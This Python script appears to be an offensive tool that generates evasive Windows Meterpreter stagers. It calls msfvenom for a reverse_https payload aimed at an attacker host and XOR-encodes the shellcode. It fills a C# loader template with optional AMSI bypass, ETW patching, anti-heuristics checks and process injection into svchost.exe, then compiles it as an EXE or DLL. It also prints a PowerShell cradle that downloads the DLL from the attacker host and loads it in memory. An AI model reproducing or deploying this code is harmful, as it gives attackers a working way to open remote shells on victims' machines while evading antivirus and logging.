#!/bin/env python3
import ak
import os
import subprocess
import argparse

BASE_FILENAME = 'win_msf_stager'
FN_CS = BASE_FILENAME + ".cs"
FN_SHELLCODE = BASE_FILENAME + ".sc"

MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
XOR_KEY = b'\x09'

CS_NAMESPACE = "LeMans"
CS_CLASSNAME = "Class1"
CS_ENTRY_DLL = "ferrari"

templates = {
  'cs': """
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace {cs_namespace}
{{
    public class {cs_classname}
    {{
    {imports}
        public static void {cs_entry}()
        {{
        {main_code}
        }}

    }}
}}
""",
}

def get_shellcode(msfvenom_cmd):
  shellcode = subprocess.check_output(msfvenom_cmd, shell=True)

  return shellcode

def generate(args, shellcode):
  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=ak.STAGER_URL)
  
  # Set entrypoint based on type
  if args.format == 'dll':
    cs_entry = CS_ENTRY_DLL
  else:
    cs_entry = "Main"

  # Create obfuscator for loaders that need obfuscation
  exe_path = b"C:\\\\Windows\\system32\\svchost.exe"
  path_obfuscated = ak.Obfuscator(exe_path, XOR_KEY)

  imports = f"""{ak.ARCH_DETECTION}"""

  # Add staged or stageless code
  if args.stageless and shellcode is not None:
    main_code = ak.SC_XOR_DECODER.format(xor_shellcode=shellcode.get_hex_csharp(),
                                        xor_key=shellcode.get_key_csharp())
  else:
    main_code = f"""{url_dl_code}"""

  if args.heuristics:
    imports += f"{ak.HEURISTICS_IMPORT}"
    main_code += f"{ak.HEURISTICS_CODE}"

  if args.etw:
    imports += f"{ak.ETW_FUNCS}"
    main_code += f"{ak.ETW_PATCH}"

  if args.amsi:
    imports += f"{ak.AMSI_BYPASS_IMPORT}"
    main_code += f"{ak.AMSI_BYPASS_CODE}"

  # Add loader type
  imports += ak.import_choices[args.injection]
  main_code += ak.main_choices[args.injection].format(ak=ak,
                                                      xor_path=path_obfuscated.get_hex_csharp(),
                                                      xor_key=path_obfuscated.get_key_csharp())

  # Make csharp template
  template = templates["cs"].format(imports=imports,
                                           main_code=main_code,
                                           cs_namespace=CS_NAMESPACE,
                                           cs_classname=CS_CLASSNAME,
                                           cs_entry=cs_entry)
  ak.write_file(FN_CS, template)


def generate_shellcode():
  print(f"Generating shellcode with: {MSFVENOM_CMD}")
  shellcode = ak.ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)

  ak.write_file(FN_SHELLCODE, shellcode.get_bytes())
  
  return shellcode

def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('--injection', '-i', default='standard', choices=ak.main_choices.keys())
  parser.add_argument('--format', '-f', default='exe', choices=['exe', 'dll'])
  parser.add_argument('--heuristics', default=True, action='store_true')
  parser.add_argument('--amsi', default=False, action='store_true')
  parser.add_argument('--etw', default=True, action='store_true')
  parser.add_argument('--stageless', default=False, action='store_true')

  args = parser.parse_args()

  if args.stageless:
    shellcode = generate_shellcode()
  else:
    shellcode = None

  generate(args, shellcode)

  flags = ""

  if args.format == 'dll':
    flags = "/target:library"

  ak.cs_compile(FN_CS, flags=flags)

  if args.format == 'dll':
      print("Load with:")
      ps = """
      $data = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/{fn}')
      $assem = [System.Reflection.Assembly]::Load($data)

      $class = $assem.GetType('{cs_namespace}.{cs_classname}')
      $method = $class.GetMethod("{cs_entry}")
      $method.Invoke(0, $null)
      """.format(fn=BASE_FILENAME + '.dll',
                 lhost=ak.LHOST,
                 cs_namespace=CS_NAMESPACE,
                 cs_classname=CS_CLASSNAME,
                 cs_entry=CS_ENTRY_DLL)
      print(ps)

if __name__ == "__main__":
  main()
